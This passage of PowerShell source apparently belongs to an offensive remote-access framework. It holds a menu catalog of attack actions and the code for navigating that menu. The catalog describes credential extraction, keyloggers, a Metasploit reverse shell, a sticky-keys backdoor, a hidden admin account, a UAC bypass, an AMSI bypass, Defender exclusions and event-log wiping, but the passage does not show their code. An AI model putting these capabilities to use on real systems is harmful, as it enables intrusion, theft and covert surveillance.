    $items.Add((New-ARAction -Id '623' -Title (Get-ARText 'txt244' 'PsExec hop') -Description (Get-ARText 'txt245' 'Run the payload on a second host over SMB with credentials or a hash') -Handler 'Invoke-ARModuleHopPsExec' -NeedsSession $true))
    $items.Add((New-ARAction -Id '624' -Title (Get-ARText 'txt246' 'WinRM hop') -Description (Get-ARText 'txt247' 'Chain a WinRM session to a second host through the current target') -Handler 'Invoke-ARModuleHopWinRm' -NeedsSession $true))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt207' 'Discovery') -Description (Get-ARText 'txt208' 'Enumerate the host, its accounts, its defences and its exposure')))
    $items.Add((New-ARAction -Id '320' -Title (Get-ARText 'txt194' 'Host audit') -Description 'Collect OS build, uptime, domain, hotfix level and hardware in one pass' -Handler 'Invoke-ARModuleHostAudit' -NeedsSession $false))
    $items.Add((New-ARAction -Id '321' -Title (Get-ARText 'txt195' 'AV and EDR enumeration') -Description 'List registered antivirus products, their real-time state and any EDR drivers loaded' -Handler 'Invoke-ARModuleAvEnum' -NeedsSession $false))
    $items.Add((New-ARAction -Id '322' -Title (Get-ARText 'txt196' 'SMB shares') -Description 'Enumerate SMB shares with their paths, ACLs and whether they allow anonymous access' -Handler 'Invoke-ARModuleShareEnum' -NeedsSession $false))
    $items.Add((New-ARAction -Id '323' -Title (Get-ARText 'txt197' 'Local administrators') -Description 'Show every member of the local Administrators group with account type and source' -Handler 'Invoke-ARModuleLocalAdmins' -NeedsSession $false))
    $items.Add((New-ARAction -Id '324' -Title (Get-ARText 'txt198' 'Installed software') -Description 'List installed applications with version and publisher from the registry uninstall keys' -Handler 'Invoke-ARModuleSoftwareEnum' -NeedsSession $false))
    $items.Add((New-ARAction -Id '325' -Title (Get-ARText 'txt199' 'Scheduled tasks') -Description 'Dump scheduled tasks with their triggers, run-as account and executed command' -Handler 'Invoke-ARModuleTaskEnum' -NeedsSession $false))
    $items.Add((New-ARAction -Id '326' -Title (Get-ARText 'txt200' 'Services') -Description 'Enumerate services with binary path, start mode, state and unquoted path findings' -Handler 'Invoke-ARModuleServiceEnum' -NeedsSession $false))
    $items.Add((New-ARAction -Id '327' -Title (Get-ARText 'txt201' 'Autoruns') -Description 'Collect Run keys, startup folders and logon scripts that survive a reboot' -Handler 'Invoke-ARModuleAutoruns' -NeedsSession $false))
    $items.Add((New-ARAction -Id '328' -Title (Get-ARText 'txt202' 'Domain information') -Description 'Query the domain for its controllers, trusts, password policy and privileged groups' -Handler 'Invoke-ARModuleDomainInfo' -NeedsSession $false))
    $items.Add((New-ARAction -Id '329' -Title (Get-ARText 'txt203' 'Network configuration') -Description 'Dump interfaces, addresses, gateways, DNS servers and routes of the target' -Handler 'Invoke-ARModuleNetworkConfig' -NeedsSession $false))
    $items.Add((New-ARAction -Id '330' -Title (Get-ARText 'txt204' 'ARP and connections') -Description 'Read the ARP cache and the established TCP connections with their owning process' -Handler 'Invoke-ARModuleArpTable' -NeedsSession $false))
    $items.Add((New-ARAction -Id '331' -Title (Get-ARText 'txt205' 'SMB audit') -Description 'Check SMB signing, dialect and guest access to spot relay and downgrade paths' -Handler 'Invoke-ARModuleSmbAudit' -NeedsSession $false))
    $items.Add((New-ARAction -Id '332' -Title (Get-ARText 'txt206' 'Patch audit') -Description 'Compare installed hotfixes against missing patches and report the exposure' -Handler 'Invoke-ARModulePatchAudit' -NeedsSession $false))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt126' 'Remote Desktop Forensics') -Description (Get-ARText 'txt142' 'Recover session history and enumerate local accounts')))
    $items.Add((New-ARAction -Id '401' -Title (Get-ARText 'txt11' 'Rebuild the image cache') -Description (Get-ARText 'txt129' 'Recover the RDP session history cached on this computer') -Handler 'Invoke-ARModuleRdpCaching' -NeedsTarget $false -NeedsSession $false))
    $items.Add((New-ARAction -Id '402' -Title (Get-ARText 'txt127' 'List local users and groups') -Description (Get-ARText 'txt109' 'List every user with SID, groups and last logon details') -Handler 'Invoke-ARModuleListUsers'))
    $items.Add((New-ARAction -Id '403' -Title (Get-ARText 'txt128' 'Extract session credentials (SessionGopher)') -Description (Get-ARText 'txt110' 'Extract credentials stored by PuTTY, SuperPuTTY, FileZilla and WinSCP') -Handler 'Invoke-ARModuleSessionGopher'))
    $items.Add((New-ARAction -Id '804' -Title (Get-ARText 'txt169' 'Shadow copies') -Description 'List and expose the volume shadow copies of the target' -Handler 'Invoke-ARAttackShadowCopies' -NeedsSession $true))
    $items.Add((New-ARAction -Id '902' -Title (Get-ARText 'txt172' 'Screenshot loop') -Description 'Capture the target screen every N seconds and store the frames locally' -Handler 'Invoke-ARModuleScreenshotLoop' -NeedsSession $true))
    $items.Add((New-ARAction -Id '903' -Title (Get-ARText 'txt173' 'Clipboard watch') -Description 'Poll the clipboard of the interactive session and log every change' -Handler 'Invoke-ARModuleClipboardWatch' -NeedsSession $true))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt64' 'Backdoors and persistence') -Description (Get-ARText 'txt143' 'Sticky keys, Metasploit and a remote keylogger')))
    $items.Add((New-ARAction -Id '501' -Title (Get-ARText 'txt223' 'Sticky Keys Hacking') -Description (Get-ARText 'txt111' 'Replace sethc.exe so a SYSTEM console opens from the login screen') -Handler 'Invoke-ARModuleStickyKeys'))
    $items.Add((New-ARAction -Id '502' -Title (Get-ARText 'txt224' 'Metasploit Reverse Shell') -Description (Get-ARText 'txt112' 'Deploy a persistent Metasploit reverse shell on the target') -Handler 'Invoke-ARModuleMetasploit'))
    $items.Add((New-ARAction -Id '503' -Title (Get-ARText 'txt225' 'Remote Keylogger') -Description (Get-ARText 'txt113' 'Log every keystroke typed on the target console') -Handler 'Invoke-ARModuleKeylogger'))
    $items.Add((New-ARAction -Id '904' -Title (Get-ARText 'txt174' 'Fast keylogger') -Description 'Log keystrokes and mirror the buffer back to the operator every 15 seconds' -Handler 'Invoke-ARModuleKeyloggerFast' -NeedsSession $true))
    $items.Add((New-ARAction -Id '504' -Title (Get-ARText 'txt175' 'Persistence kit') -Description 'Install a Run key, a scheduled task and a WMI subscription in one pass' -Handler 'Invoke-ARModulePersistenceKit' -NeedsSession $true))
    $items.Add((New-ARAction -Id '520' -Title (Get-ARText 'txt226' 'Startup shortcut') -Description (Get-ARText 'txt227' 'Drop a .lnk in the Startup folder of the current user and of all users') -Handler 'Invoke-ARModuleStartupShortcut' -NeedsSession $true))
    $items.Add((New-ARAction -Id '521' -Title (Get-ARText 'txt228' 'SSH authorized_keys') -Description (Get-ARText 'txt229' 'Append the operator public key to authorized_keys in every user profile') -Handler 'Invoke-ARModuleSshAuthorizedKeys' -NeedsSession $true))
    $items.Add((New-ARAction -Id '522' -Title (Get-ARText 'txt230' 'Service persistence') -Description (Get-ARText 'txt231' 'Register an automatic service that runs the payload at boot') -Handler 'Invoke-ARModuleServicePersistence' -NeedsSession $true))
    $items.Add((New-ARAction -Id '523' -Title (Get-ARText 'txt232' 'Boot task') -Description (Get-ARText 'txt233' 'Schedule a task that runs the payload as SYSTEM when the system starts') -Handler 'Invoke-ARModuleBootTask' -NeedsSession $true))
    $items.Add((New-ARAction -Id '524' -Title (Get-ARText 'txt234' 'WMI subscription') -Description (Get-ARText 'txt235' 'Bind a WMI event filter to a command consumer so the payload runs on every event') -Handler 'Invoke-ARModuleWmiSubscription' -NeedsSession $true))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt68' 'Privilege escalation') -Description (Get-ARText 'txt144' 'Enumerate services, patches and paths to SYSTEM')))
    $items.Add((New-ARAction -Id '601' -Title (Get-ARText 'txt70' 'Get operating system information') -Description (Get-ARText 'txt114' 'Full enumeration of privesc surface and local misconfigurations') -Handler 'Invoke-ARModuleChachi'))
    $items.Add((New-ARAction -Id '602' -Title (Get-ARText 'txt71' 'Search vulnerabilities with Sherlock') -Description (Get-ARText 'txt115' 'Scan the system for known kernel and service vulnerabilities') -Handler 'Invoke-ARModuleSherlock'))
    $items.Add((New-ARAction -Id '603' -Title (Get-ARText 'txt130' 'Privilege escalation audit') -Description (Get-ARText 'txt116' 'Audit services, tasks, permissions and patches for escalation paths') -Handler 'Invoke-ARModulePrivescCheck'))
    $items.Add((New-ARAction -Id '420' -Title (Get-ARText 'txt209' 'AlwaysInstallElevated') -Description 'Check whether the AlwaysInstallElevated policy lets the current user install a package as SYSTEM' -Handler 'Invoke-ARModuleAlwaysInstallElevated' -NeedsSession $false))
    $items.Add((New-ARAction -Id '421' -Title (Get-ARText 'txt210' 'Unquoted service paths') -Description 'List services whose unquoted binary path sits under a folder the current user can write' -Handler 'Invoke-ARModuleUnquotedServicePath' -NeedsSession $false))
    $items.Add((New-ARAction -Id '422' -Title (Get-ARText 'txt211' 'Service permissions') -Description 'Show which services this user can reconfigure, restart or take ownership of' -Handler 'Invoke-ARModuleServicePermissions' -NeedsSession $false))
    $items.Add((New-ARAction -Id '423' -Title (Get-ARText 'txt212' 'Potato check') -Description 'Report whether SeImpersonate or SeAssignPrimaryToken is held and a Potato attack is viable' -Handler 'Invoke-ARModulePotatoCheck' -NeedsSession $false))
    $items.Add((New-ARAction -Id '424' -Title (Get-ARText 'txt213' 'UAC bypass (fodhelper)') -Description 'Hijack the fodhelper.exe registry key so a command runs elevated without a prompt' -Handler 'Invoke-ARModuleUacBypass' -NeedsSession $false))
    $items.Add((New-ARAction -Id '425' -Title (Get-ARText 'txt214' 'Run as SYSTEM (task)') -Description 'Register a scheduled task running as SYSTEM and open a shell through it' -Handler 'Invoke-ARModuleSystemTask' -NeedsSession $false))
    $items.Add((New-ARAction -Id '426' -Title (Get-ARText 'txt215' 'Run as SYSTEM (service)') -Description 'Create a LocalSystem service and start a process as SYSTEM in session 0' -Handler 'Invoke-ARModuleSystemService' -NeedsSession $false))
    $items.Add((New-ARAction -Id '427' -Title (Get-ARText 'txt216' 'Backdoor account') -Description 'Create a local administrator account hidden from the logon screen' -Handler 'Invoke-ARModuleBackdoorAccount' -NeedsSession $false))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt69' 'Other modules') -Description (Get-ARText 'txt145' 'Logs, VNC, external scripts and user switching')))
    $items.Add((New-ARAction -Id '701' -Title (Get-ARText 'txt18' 'Deactivate system logs') -Description (Get-ARText 'txt117' 'Wipe event logs without stopping the EventLog service') -Handler 'Invoke-ARModulePhant0m'))
    $items.Add((New-ARAction -Id '805' -Title (Get-ARText 'txt170' 'Event log clear') -Description 'Clear the Windows event logs on the target after a confirmation' -Handler 'Invoke-ARAttackEventLogClear' -NeedsSession $true))
    $items.Add((New-ARAction -Id '802' -Title (Get-ARText 'txt167' 'Defender exclusions') -Description 'Add path and process exclusions to Defender and undo them on cleanup' -Handler 'Invoke-ARAttackDefenderExclude' -NeedsSession $true))
    $items.Add((New-ARAction -Id '803' -Title (Get-ARText 'txt168' 'AMSI bypass') -Description 'Patch AMSI inside the remote runspace so script scanning stops reporting' -Handler 'Invoke-ARAttackAmsiBypass' -NeedsSession $true))
    $items.Add((New-ARAction -Id '702' -Title (Get-ARText 'txt62' 'Remote VNC Server (legacy)') -Description (Get-ARText 'txt118' 'Open an invisible VNC to watch and control the target screen') -Handler 'Invoke-ARModuleVncServer'))
    $items.Add((New-ARAction -Id '703' -Title (Get-ARText 'txt67' 'External script execution') -Description (Get-ARText 'txt119' 'Run any external PowerShell script or function on the target') -Handler 'Invoke-ARModuleExternalScript'))
    $items.Add((New-ARAction -Id '704' -Title (Get-ARText 'txt79' 'Change user with RunAs') -Description (Get-ARText 'txt120' 'Validate credentials and launch processes as another user') -Handler 'Invoke-ARModuleRunAs' -NeedsTarget $false -NeedsSession $false))

    $script:ARActionCatalogCache = $items.ToArray()
    return $script:ARActionCatalogCache
}

function Get-ARActionById {
    param([string]$Id = '')
    if ([string]::IsNullOrWhiteSpace($Id)) { return $null }
    foreach ($item in Get-ARActionCatalog) {
        if ($item.Kind -eq 'Action' -and $item.Id -eq $Id) {
            return $item
        }
    }
    return $null
}

function Get-ARFilteredCatalog {
    param([string]$Filter = '')
    $catalog = @(Get-ARActionCatalog)
    if ($null -eq $Filter -or $Filter.Trim() -eq '') {
        return $catalog
    }
    $needle = $Filter.Trim().ToLowerInvariant()
    $result = New-Object System.Collections.Generic.List[object]
    $pendingGroup = $null
    $groupAdded = $false
    foreach ($item in $catalog) {
        if ($item.Kind -eq 'Group') {
            $pendingGroup = $item
            $groupAdded = $false
            continue
        }
        $haystack = ($item.Id + ' ' + $item.Title + ' ' + $item.Description).ToLowerInvariant()
        if ($haystack.Contains($needle)) {
            if ($pendingGroup -and -not $groupAdded) {
                $result.Add($pendingGroup)
                $groupAdded = $true
            }
            $result.Add($item)
        }
    }
    return $result.ToArray()
}

function Get-ARActionCategories {
    $catalog = @(Get-ARActionCatalog)
    $buckets = New-Object System.Collections.Generic.List[object]
    $current = @{
        Key         = 'quick'
        Title       = (Get-ARText 'txt137' 'Quick actions')
        Description = (Get-ARText 'txt138' 'One-shot remote execution and live screen control')
        Actions     = (New-Object System.Collections.Generic.List[object])
    }
    $buckets.Add($current)
    foreach ($item in $catalog) {
        if ($item.Kind -eq 'Group') {
            $description = ''
            if ($item.PSObject.Properties['Description']) { $description = [string]$item.Description }
            $current = @{
                Key         = 'pending'
                Title       = [string]$item.Title
                Description = $description
                Actions     = (New-Object System.Collections.Generic.List[object])
            }
            $buckets.Add($current)
            continue
        }
        $current['Actions'].Add($item)
    }
    $categories = New-Object System.Collections.Generic.List[object]
    foreach ($bucket in $buckets) {
        $actions = @($bucket['Actions'].ToArray())
        if ($actions.Count -eq 0) { continue }
        $key = [string]$bucket['Key']
        if ($key -eq 'pending') { $key = 'group-' + [string]$actions[0].Id }
        $description = [string]$bucket['Description']
        if ([string]::IsNullOrWhiteSpace($description)) {
            $description = (Format-ARItemCount -Count $actions.Count -Plural (Get-ARText 'txt146' 'actions'))
        }
        $categories.Add([pscustomobject]@{
            Kind        = 'Category'
            Key         = $key
            Title       = [string]$bucket['Title']
            Description = $description
            Actions     = $actions
        })
    }
    return $categories.ToArray()
}

function Get-ARCategoryByKey {
    param([string]$Key = '')
    if ([string]::IsNullOrWhiteSpace($Key)) { return $null }
    foreach ($category in @(Get-ARActionCategories)) {
        if ($category.Key -eq $Key) { return $category }
    }
    return $null
}

function Get-ARCategoryForAction {
    param([string]$Id = '')
    if ([string]::IsNullOrWhiteSpace($Id)) { return $null }
    foreach ($category in @(Get-ARActionCategories)) {
        foreach ($action in $category.Actions) {
            if ($action.Id -eq $Id) { return $category }
        }
    }
    return $null
}

function Get-ARCategoryListForDisplay {
    $categories = @(Get-ARActionCategories)
    if ($script:ARTuiLevel -ne 'categories') { return $categories }
    if ([string]::IsNullOrWhiteSpace($script:ARFilter)) { return $categories }
    $needle = $script:ARFilter.Trim().ToLowerInvariant()
    $result = New-Object System.Collections.Generic.List[object]
    foreach ($category in $categories) {
        $haystack = ([string]$category.Title + ' ' + [string]$category.Description).ToLowerInvariant()
        if ($haystack.Contains($needle)) { $result.Add($category); continue }
        # A category survives the filter when one of its actions matches, so a
        # search for a module name still leads to the category that holds it.
        foreach ($action in $category.Actions) {
            $entry = ([string]$action.Id + ' ' + [string]$action.Title + ' ' + [string]$action.Description).ToLowerInvariant()
            if ($entry.Contains($needle)) { $result.Add($category); break }
        }
    }
    return $result.ToArray()
}

function Get-ARCurrentCategory {
    $categories = @(Get-ARCategoryListForDisplay)
    if ($categories.Count -eq 0) { return $null }
    foreach ($category in $categories) {
        if ($category.Key -eq $script:ARSelectedCategoryKey) { return $category }
    }
    return $categories[0]
}

function Get-ARCategoryActionList {
    param($Category, [string]$Filter = '')
    if ($null -eq $Category) { return @() }
    $actions = @($Category.Actions)
    if ([string]::IsNullOrWhiteSpace($Filter)) { return $actions }
    # One matcher for the whole UI: the catalog-wide filter decides which ids
    # survive, this keeps them in the order they appear inside the category.
    $matched = @(Get-ARFilteredCatalog -Filter $Filter | Where-Object { $_.Kind -eq 'Action' })
    if ($matched.Count -eq 0) { return @() }
    $keep = @{}
    foreach ($item in $matched) { $keep[[string]$item.Id] = $true }
    $result = New-Object System.Collections.Generic.List[object]
    foreach ($action in $actions) {
        if ($keep.ContainsKey([string]$action.Id)) { $result.Add($action) }
    }
    return $result.ToArray()
}

function Get-ARPinnedOrder {
    param([object[]]$Actions = @())
    if ($Actions.Count -lt 2) { return $Actions }
    $favorites = @(Get-ARFavorites)
    if ($favorites.Count -eq 0) { return $Actions }
    $pinned = New-Object System.Collections.Generic.List[object]
    $rest = New-Object System.Collections.Generic.List[object]
    foreach ($action in $Actions) {
        if ($favorites -contains [string]$action.Id) { $pinned.Add($action) }
        else { $rest.Add($action) }
    }
    if ($pinned.Count -eq 0) { return $Actions }
    foreach ($action in $rest) { $pinned.Add($action) }
    return $pinned.ToArray()
}

function Get-ARCurrentActions {
    $category = Get-ARCurrentCategory
    $actions = @(Get-ARCategoryActionList -Category $category -Filter $script:ARFilter)
    return @(Get-ARPinnedOrder -Actions $actions)
}

function Get-ARCurrentAction {
    $actions = @(Get-ARCurrentActions)
    if ($actions.Count -eq 0) { return $null }
    foreach ($action in $actions) {
        if ($action.Id -eq $script:ARSelectedId) { return $action }
    }
    return $actions[0]
}

function Get-ARTuiListHeight {
    $height = Get-ARConsoleHeight
    return [Math]::Max(3, $height - 15)
}

function Initialize-ARTuiState {
    $categories = @(Get-ARActionCategories)
    if ($categories.Count -eq 0) {
        $script:ARTuiLevel = 'categories'
        return
    }
    if (-not [string]::IsNullOrWhiteSpace($script:ARSelectedId)) {
        $owner = Get-ARCategoryForAction $script:ARSelectedId
        if ($null -ne $owner) {
            $script:ARSelectedCategoryKey = $owner.Key
            if ($script:ARTuiLevel -ne 'categories' -and $script:ARTuiLevel -ne 'actions') {
                $script:ARTuiLevel = 'actions'
            }
            return
        }
    }
    if ($script:ARTuiLevel -ne 'actions') { $script:ARTuiLevel = 'categories' }
    $category = Get-ARCategoryByKey $script:ARSelectedCategoryKey
    if ($null -eq $category) {
        $category = $categories[0]
        $script:ARSelectedCategoryKey = $category.Key
    }
    if ([string]::IsNullOrWhiteSpace($script:ARSelectedId) -and $category.Actions.Count -gt 0) {
        $script:ARSelectedId = [string]$category.Actions[0].Id
    }
}

function Set-ARTuiCategory {
    param($Category)
    if ($null -eq $Category) { return }
    $script:ARSelectedCategoryKey = $Category.Key
    $script:ARCategoryScroll = 0
    if ($Category.Actions.Count -gt 0) {
        $script:ARSelectedId = [string]$Category.Actions[0].Id
    }
}

function Enter-ARTuiCategory {
    param([string]$Key = '')
    $category = Get-ARCategoryByKey $Key
    if ($null -eq $category) { return }
    $script:ARFilterStore['categories'] = $script:ARFilter
    $script:ARSelectedCategoryKey = $category.Key
    $script:ARTuiLevel = 'actions'
    $script:ARFilter = [string]$script:ARFilterStore['actions']
    $script:ARScroll = 0
    $inside = $false
    foreach ($action in $category.Actions) {
        if ($action.Id -eq $script:ARSelectedId) { $inside = $true; break }
    }
    if (-not $inside -and $category.Actions.Count -gt 0) {
        $script:ARSelectedId = [string]$category.Actions[0].Id
    }
    Set-ARStatus ((Get-ARText 'txt151' 'Category') + ': ' + $category.Title) 'Info'
}

function Exit-ARTuiCategory {
    $script:ARFilterStore['actions'] = $script:ARFilter
    $script:ARTuiLevel = 'categories'
    $script:ARFilter = [string]$script:ARFilterStore['categories']
    $category = Get-ARCurrentCategory
    if ($null -ne $category) {
        $script:ARSelectedCategoryKey = $category.Key
    }
    Set-ARStatus (Get-ARText 'txt149' 'Top level - choose a category') 'Info'
}

function Sync-ARTuiFilterSelection {
    # A live filter can drop the highlighted row, so the selection follows the
    # first surviving entry instead of pointing at nothing.
    if ($script:ARTuiLevel -eq 'categories') {
        $categories = @(Get-ARCategoryListForDisplay)
        if ($categories.Count -eq 0) { return }
        foreach ($category in $categories) {
            if ($category.Key -eq $script:ARSelectedCategoryKey) { return }
        }
        $script:ARSelectedCategoryKey = $categories[0].Key
        if ($categories[0].Actions.Count -gt 0) { $script:ARSelectedId = [string]$categories[0].Actions[0].Id }
        return
    }
    $actions = @(Get-ARCurrentActions)
    if ($actions.Count -eq 0) { return }
    foreach ($action in $actions) {
        if ($action.Id -eq $script:ARSelectedId) { return }
    }
    $script:ARSelectedId = [string]$actions[0].Id
}

function Move-ARTuiSelection {
    param(
        [int]$Delta = 0,
        [switch]$Page
    )
    if ($script:ARTuiLevel -eq 'actions') {
        $actions = @(Get-ARCurrentActions)
        if ($actions.Count -eq 0) { return }
        $current = Get-ARCurrentAction
        $index = 0
        for ($i = 0; $i -lt $actions.Count; $i++) {
            if ($actions[$i].Id -eq $current.Id) { $index = $i; break }
        }
        if ($Page) {
            $step = [Math]::Max(3, (Get-ARTuiListHeight) - 1)
            $index = $index + ($Delta * $step)
            if ($index -lt 0) { $index = 0 }
            if ($index -ge $actions.Count) { $index = $actions.Count - 1 }
        }
        else {
            $index = $index + $Delta
            if ($index -lt 0) { $index = $actions.Count - 1 }
            if ($index -ge $actions.Count) { $index = 0 }
        }
        $script:ARSelectedId = [string]$actions[$index].Id
        return
    }
    $categories = @(Get-ARCategoryListForDisplay)
    if ($categories.Count -eq 0) { return }
    $current = Get-ARCurrentCategory
    $index = 0
    for ($i = 0; $i -lt $categories.Count; $i++) {
        if ($null -ne $current -and $categories[$i].Key -eq $current.Key) { $index = $i; break }
    }
    if ($Page) {
        $step = [Math]::Max(3, (Get-ARTuiListHeight) - 1)
        $index = $index + ($Delta * $step)
        if ($index -lt 0) { $index = 0 }
        if ($index -ge $categories.Count) { $index = $categories.Count - 1 }
    }
    else {
        $index = $index + $Delta
        if ($index -lt 0) { $index = $categories.Count - 1 }
        if ($index -ge $categories.Count) { $index = 0 }
    }
    Set-ARTuiCategory $categories[$index]
}

function Set-ARTuiSelectionEdge {
    param([switch]$Last)
    if ($script:ARTuiLevel -eq 'actions') {
        $actions = @(Get-ARCurrentActions)
        if ($actions.Count -eq 0) { return }
        if ($Last) { $script:ARSelectedId = [string]$actions[$actions.Count - 1].Id }
        else { $script:ARSelectedId = [string]$actions[0].Id }
        return
    }
    $categories = @(Get-ARCategoryListForDisplay)
    if ($categories.Count -eq 0) { return }
    if ($Last) { Set-ARTuiCategory $categories[$categories.Count - 1] }
    else { Set-ARTuiCategory $categories[0] }
}

function Test-ARTuiNumberExact {
    param([string]$Digits = '')
    if ([string]::IsNullOrWhiteSpace($Digits)) { return $false }
    if ($script:ARTuiLevel -eq 'categories') {
        $categories = @(Get-ARCategoryListForDisplay)
        $number = 0
        if (-not [int]::TryParse($Digits, [ref]$number)) { return $false }
        return ($number -ge 1 -and $number -le $categories.Count)
    }
    foreach ($action in @(Get-ARCurrentActions)) {
        if ($action.Id -eq $Digits) { return $true }
    }
    return $false
}

function Test-ARTuiNumberPrefix {
    param([string]$Digits = '')
    if ([string]::IsNullOrWhiteSpace($Digits)) { return $false }
    if ($script:ARTuiLevel -ne 'actions') { return $false }
    foreach ($action in @(Get-ARCurrentActions)) {
        $id = [string]$action.Id
        if ($id.Length -gt $Digits.Length -and $id.StartsWith($Digits, [System.StringComparison]::Ordinal)) { return $true }
    }
    return $false
}

function Read-ARTuiNumberInput {
    param([string]$FirstDigit = '')
    $buffer = $FirstDigit
    if ($script:ARTestMode) { return $buffer }
    $waited = 0
    $limit = 700
    while ($buffer.Length -lt 4 -and $waited -lt $limit) {
        $exact = Test-ARTuiNumberExact $buffer
        $ambiguous = Test-ARTuiNumberPrefix $buffer
        if ($exact -and -not $ambiguous) { break }
        $limit = if ($ambiguous) { 400 } else { 700 }
        $hasKey = $false
        try { $hasKey = [Console]::KeyAvailable } catch { $hasKey = $false }
        if ($hasKey) {
            $next = [Console]::ReadKey($true)
            $character = $next.KeyChar.ToString()
            if ($character -match '^\d$') {
                $buffer += $character
                $waited = 0
            }
            else {
                $script:ARPendingKey = $next
                break
            }
        }
        else {
            Start-Sleep -Milliseconds 25
            $waited += 25
        }
    }
    return $buffer
}

function Resolve-ARTuiNumber {
    param([string]$Digits = '')
    if ([string]::IsNullOrWhiteSpace($Digits)) { return $false }
    $number = 0
    if (-not [int]::TryParse($Digits, [ref]$number)) { return $false }
    if ($script:ARTuiLevel -eq 'categories') {
        $categories = @(Get-ARCategoryListForDisplay)
        if ($number -ge 1 -and $number -le $categories.Count) {
            Set-ARTuiCategory $categories[$number - 1]
            return $true
        }
    }
    else {
        $actions = @(Get-ARCurrentActions)
        foreach ($action in $actions) {
            if ($action.Id -eq $Digits) {
                $script:ARSelectedId = $action.Id
                return $true
            }
        }
        if ($number -ge 1 -and $number -le $actions.Count) {
            $script:ARSelectedId = [string]$actions[$number - 1].Id
            return $true
        }
    }
    if ($Digits.Length -lt 2) { return $false }
    $code = Resolve-ARSelection $Digits
    if ($code -notlike 'ACTION:*') { return $false }
    $actionId = $code.Substring(7)
    $owner = Get-ARCategoryForAction $actionId
    if ($null -eq $owner) { return $false }
    $script:ARTuiLevel = 'actions'
    $script:ARSelectedCategoryKey = $owner.Key
    $script:ARSelectedId = $actionId
    $script:ARFilter = ''
    $script:ARScroll = 0
    return $true
}

function Step-ARTuiBack {
    if ($script:ARFilter -ne '') {
        $script:ARFilter = ''
        $script:ARFilterStore[$script:ARTuiLevel] = ''
        Set-ARStatus (Get-ARText 'txt154' 'Filter cleared') 'Info'
        return
    }
    if ($script:ARTuiLevel -eq 'actions') {
        Exit-ARTuiCategory
        return
    }
    Set-ARStatus (Get-ARText 'txt149' 'Top level - choose a category') 'Info'
}

function Resolve-ARSelection {
    param([string]$Selection)
    $value = ''
    if ($null -ne $Selection) { $value = $Selection.Trim() }
    if ($value -eq '') { return '' }
    $upper = $value.ToUpperInvariant()
    if ($upper -in @('Q', 'QUIT', 'X', 'EXIT')) { return 'QUIT' }
    if ($upper -in @('L', 'LANG', 'LANGUAGE')) { return 'LANGUAGE' }
    if ($upper -in @('T', 'TARGET')) { return 'TARGET' }
    if ($upper -in @('P', 'PROFILES', 'TARGETS')) { return 'PROFILES' }
    if ($upper -in @('S', 'SAVE')) { return 'SAVE' }
    if ($value -match '^1[1-7]$') {
        $mapped = $script:ARLegacyMap[$value]
        if ($mapped) { return 'ACTION:' + $mapped }
        return ''
    }
    $action = Get-ARActionById $value
    if ($action) { return 'ACTION:' + $action.Id }
    return ''
}

function Move-ARSelection {
    param([int]$Delta)
    Move-ARTuiSelection -Delta $Delta
}

function Get-ARTargetUserLabel {
    if ($script:ARTarget['User']) { return $script:ARTarget['User'] }
    return [Environment]::UserName
}

function Get-ARVersionLabel {
    $version = Get-Variable -Name 'ARVersion' -Scope Script -ErrorAction SilentlyContinue
    if ($null -ne $version -and -not [string]::IsNullOrWhiteSpace([string]$version.Value)) {
        return [string]$version.Value
    }
    return '6.0'
}

function Format-ARItemCount {
    param([int]$Count = 0, [string]$Plural = 'items')
    if ($Count -eq 1) {
        if ($Plural.Length -gt 1 -and $Plural.EndsWith('s')) {
            return ('1 ' + $Plural.Substring(0, $Plural.Length - 1))
        }
        return ('1 ' + $Plural)
    }
    return ('{0} {1}' -f $Count, $Plural)
}

function Format-ARBoxText {
    param(
        [AllowNull()][string]$Text,
        [int]$MaxWidth
    )
    if ($MaxWidth -lt 1) { return '' }
    if ($null -eq $Text) { return '' }
    $flat = ($Text -replace '[\r\n\t]+', ' ')
    if ($flat.Length -le $MaxWidth) { return $flat }
    if ($MaxWidth -le 3) { return $flat.Substring(0, $MaxWidth) }
    return $flat.Substring(0, $MaxWidth - 3) + '...'
}

function Format-ARLeader {
    param(
        [string]$Label = '',
        [string]$Right = '',
        [int]$Width = 0,
        [string]$Fill = '.'
    )
    if ($Width -lt 1) { return '' }
    $left = Format-ARBoxText $Label $Width
    $right = Format-ARBoxText $Right $Width
    $space = $Width - $left.Length - $right.Length
    if ($space -le 0) {
        return (Format-ARBoxText ($left + ' ' + $right) $Width)
    }
    if ($space -eq 1) { return ($left + ' ' + $right) }
    $fill = $Fill * ($space - 2)
    return ($left + ' ' + $fill + ' ' + $right)
}

function Write-ARBoxBorder {
    param(
        [int]$Width,
        [string]$Color = 'DarkCyan'
    )
    $inner = [Math]::Max(0, $Width - 2)
    Write-ARLine ('+' + ('-' * $inner) + '+') $Color
}

function Write-ARBoxRule {
    param(
        [int]$Width,
        [string]$Label = '',
        [string]$Color = 'DarkCyan'
    )
    $inner = [Math]::Max(0, $Width - 2)
    if ([string]::IsNullOrWhiteSpace($Label)) {
        Write-ARLine ('+' + ('-' * $inner) + '+') $Color
        return
    }
    $text = Format-ARBoxText $Label ($inner - 5)
    $segment = '-- ' + $text + ' '
    $fill = [Math]::Max(0, $inner - $segment.Length)
    Write-ARLine ('+' + $segment + ('-' * $fill) + '+') $Color
}

function Write-ARBoxLine {
    param(
        [AllowEmptyString()][string]$Text = '',
        [int]$Width,
        [string]$Color = 'Gray',
        [string]$Background = ''
    )
    $contentWidth = [Math]::Max(1, $Width - 4)
    $body = Format-ARBoxText $Text $contentWidth
    if ($body.Length -lt $contentWidth) { $body = $body.PadRight($contentWidth) }
    Write-ARLine ('| ' + $body + ' |') $Color $Background
}

function Write-ARBoxColumns {
    param(
        [string]$Left = '',
        [string]$Right = '',
        [int]$Width,
        [string]$Color = 'Gray',
        [string]$Background = ''
    )
    $contentWidth = [Math]::Max(1, $Width - 4)
    $leftText = Format-ARBoxText $Left $contentWidth
    $rightText = Format-ARBoxText $Right $contentWidth
    $space = $contentWidth - $leftText.Length - $rightText.Length
    if ($space -lt 1) {
        $rightText = ''
        $space = $contentWidth - $leftText.Length
    }
    $line = $leftText + (' ' * [Math]::Max(0, $space)) + $rightText
    if ($line.Length -lt $contentWidth) { $line = $line.PadRight($contentWidth) }
    if ($line.Length -gt $contentWidth) { $line = $line.Substring(0, $contentWidth) }
    Write-ARLine ('| ' + $line + ' |') $Color $Background
}

function Read-ARTuiInlineInput {
    param(
